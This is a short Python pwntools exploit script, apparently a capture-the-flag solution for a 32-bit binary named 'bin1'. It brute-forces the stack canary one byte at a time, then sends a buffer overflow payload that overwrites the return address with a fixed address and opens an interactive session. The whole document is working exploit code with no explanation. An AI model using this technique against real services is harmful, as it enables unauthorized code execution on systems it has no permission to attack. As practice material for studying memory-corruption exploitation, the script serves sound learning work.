from pwn import *
local = 1
elf = ELF('./bin1')

if local:
    p = process('./bin1')
    libc = elf.libc

else:
    p = remote('',)
    libc = ELF('./')
p.recvuntil('welcome\n')
canary = '\x00'
for k in range(3):
    for i in range(256):
        print "the " + str(k) + ": " + chr(i)
        p.send('a'*100 + canary + chr(i))
        a = p.recvuntil("welcome\n")
        print a
        if "sucess" in a:
                canary += chr(i)
                print "canary: " + canary
                break
addr = 0x0804863B
payload = 'A' * 100 + canary + 'A' * 12 + p32(addr)

p.send(payload)
p.interactive()

